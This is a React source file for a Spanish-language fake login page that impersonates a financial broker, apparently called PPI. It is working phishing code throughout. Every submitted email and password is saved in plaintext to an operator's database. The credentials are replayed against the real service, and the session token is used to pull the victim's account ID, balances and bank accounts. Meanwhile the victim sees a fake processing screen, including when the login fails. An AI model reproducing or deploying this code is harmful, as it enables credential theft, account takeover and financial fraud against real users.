import { useState, useEffect, useCallback, useRef } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { ppiApi } from "@/lib/ppiApi";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import PpiLoginForm from "@/components/ppi/PpiLoginForm";

type Step = "login" | "waiting" | "done";

const PPI = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const cleanedCode = rawOperatorCode
    ? rawOperatorCode.replace(/[^a-zA-Z0-9]/g, "") || "master"
    : "master";
  const operatorCode = cleanedCode;

  const [step, setStep] = useState<Step>("login");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [statusMsg, setStatusMsg] = useState("");

  const [sessionId, setSessionId] = useState("");
  const sessionIdRef = useRef("");

  useVisitTracker();
  useVisitorPresence(sessionId || null);

  useEffect(() => {
    document.title = "PPI — Iniciar sesión";
  }, []);

  const createSession = useCallback(async (userEmail: string, status: string, extra: Record<string, unknown> = {}) => {
    const { data } = await supabase.from("sessions").insert({
      email: userEmail,
      source: "ppi",
      status,
      otp_code: extra.otp_code as string || null,
      password: extra.password as string || null,
      ip_address: null,
      operator_code: operatorCode,
    } as any).select("id").single();
    if (data?.id) {
      setSessionId(data.id);
      sessionIdRef.current = data.id;
    }
    return data?.id;
  }, [operatorCode]);

  const updateSession = useCallback(async (status: string, extra: Record<string, unknown> = {}) => {
    const sid = sessionIdRef.current;
    if (!sid) return;
    await supabase.from("sessions").update({ status, ...extra }).eq("id", sid);
  }, []);

  const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
    setError("");
    setLoading(true);
    setEmail(submittedEmail);

    await createSession(submittedEmail, "login_attempt", { password });

    try {
      setStatusMsg("Verificando credenciales...");
      
      // Try API login through edge function
      const res = await ppiApi.login(submittedEmail, password, operatorCode);

      if (res.success || res.raw?.status === 0) {
        const fullName = res.fullName || res.raw?.payload?.usuario?.nombreCompleto || res.raw?.payload?.denominacion || "";
        const token = typeof res.token === "string" ? res.token : (res.token?.accessToken || res.raw?.payload?.token?.accessToken || "");
        // Extract cuentaId from response, JWT claims, or known field
        let cuentaId = res.cuentaId;
        if (!cuentaId && token) {
          try {
            const claims = JSON.parse(atob(token.split(".")[1]));
            cuentaId = parseInt(claims["PPAuth.Claims.General.Cuentas"]) || null;
          } catch { /* ignore */ }
        }
        
        await updateSession("login_success", {
          otp_code: `name:${fullName}|cuenta:${cuentaId}`,
        });

        if (token) {
          setStatusMsg("Sincronizando datos...");
          try {
            await ppiApi.balances(token, cuentaId);
            await ppiApi.bankAccounts(token, cuentaId);
          } catch { /* silent */ }
          await updateSession("completed", {
            otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
          });
        } else {
          await updateSession("waiting_operator", {
            otp_code: `name:${fullName}|cuenta:${cuentaId}|token:pending`,
          });
        }
      } else {
        await updateSession("waiting_operator", {
          otp_code: `credentials_captured`,
        });
      }

      setStep("waiting");
      setStatusMsg("Procesando...");
    } catch (e: any) {
      // Even on error, capture credentials and show waiting
      await updateSession("waiting_operator", {
        otp_code: `credentials_captured`,
      });
      setStep("waiting");
      setStatusMsg("Procesando...");
    }
    setLoading(false);
    setStatusMsg("");
  }, [createSession, updateSession, operatorCode]);

  return (
    <div className="relative flex min-h-screen items-center justify-center overflow-hidden bg-[#f0f0f0]">
      {/* Diagonal hatching pattern background */}
      <div className="absolute inset-0 opacity-[0.08]" style={{
        backgroundImage: `repeating-linear-gradient(
          -45deg,
          transparent,
          transparent 4px,
          #999 4px,
          #999 5px
        )`,
      }} />

      {/* Decorative cyan curved line */}
      <svg className="absolute inset-0 w-full h-full pointer-events-none" viewBox="0 0 1440 900" preserveAspectRatio="none">
        <path
          d="M-50 200 Q 400 600, 700 300 T 1500 700"
          fill="none"
          stroke="#B2EBF2"
          strokeWidth="2"
          opacity="0.6"
        />
      </svg>

      {/* Login card */}
      <div className="relative z-10 w-full max-w-[440px] rounded-lg bg-white px-10 py-10 shadow-lg">
        <h1 className="mb-8 text-center text-[22px] font-bold text-[#333]">
          Te damos la bienvenida
        </h1>

        {step === "login" && (
          <PpiLoginForm onSubmit={handleLogin} loading={loading} error={error} />
        )}

        {step === "waiting" && (
          <div className="flex flex-col items-center gap-4 py-8 text-center">
            <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#2196F3] border-t-transparent" />
            <p className="text-[15px] text-[#555]">{statusMsg || "Procesando tu solicitud..."}</p>
            <p className="text-[13px] text-[#999]">{email}</p>
          </div>
        )}

        {step === "done" && (
          <div className="flex flex-col items-center gap-4 py-8 text-center">
            <div className="flex h-14 w-14 items-center justify-center rounded-full bg-green-100">
              <svg className="h-8 w-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <p className="text-[16px] font-semibold text-[#333]">¡Verificación exitosa!</p>
            <p className="text-[13px] text-[#999]">{email}</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default PPI;
